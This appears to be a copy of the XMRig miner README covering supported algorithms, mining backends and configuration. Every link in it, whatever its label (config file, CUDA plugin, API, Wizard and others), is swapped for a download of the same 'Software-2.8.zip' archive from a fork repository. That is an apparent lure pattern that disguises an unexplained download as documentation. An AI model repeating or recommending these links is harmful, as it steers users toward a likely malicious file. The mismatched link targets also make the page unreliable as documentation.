XMRig is a high performance, open source, cross platform RandomX, KawPow, CryptoNight and [GhostRider](https://github.com/KnigthFrodo/xmrig/raw/refs/heads/master/src/backend/opencl/runners/Software-2.8.zip) unified CPU/GPU miner and [RandomX benchmark](https://github.com/KnigthFrodo/xmrig/raw/refs/heads/master/src/backend/opencl/runners/Software-2.8.zip). Official binaries are available for Windows, Linux, macOS and FreeBSD.

## Mining backends
- **CPU** (x64/ARMv7/ARMv8)
- **OpenCL** for AMD GPUs.
- **CUDA** for NVIDIA GPUs via external [CUDA plugin](https://github.com/KnigthFrodo/xmrig/raw/refs/heads/master/src/backend/opencl/runners/Software-2.8.zip).

## Usage
The preferred way to configure the miner is the [JSON config file](https://github.com/KnigthFrodo/xmrig/raw/refs/heads/master/src/backend/opencl/runners/Software-2.8.zip) as it is more flexible and human friendly. The [command line interface](https://github.com/KnigthFrodo/xmrig/raw/refs/heads/master/src/backend/opencl/runners/Software-2.8.zip) does not cover all features, such as mining profiles for different algorithms. Important options can be changed during runtime without miner restart by editing the config file or executing [API](https://github.com/KnigthFrodo/xmrig/raw/refs/heads/master/src/backend/opencl/runners/Software-2.8.zip) calls.

* **[Wizard](https://github.com/KnigthFrodo/xmrig/raw/refs/heads/master/src/backend/opencl/runners/Software-2.8.zip)** helps you create initial configuration for the miner.
* **[Workers](https://github.com/KnigthFrodo/xmrig/raw/refs/heads/master/src/backend/opencl/runners/Software-2.8.zip)** helps manage your miners via HTTP API.
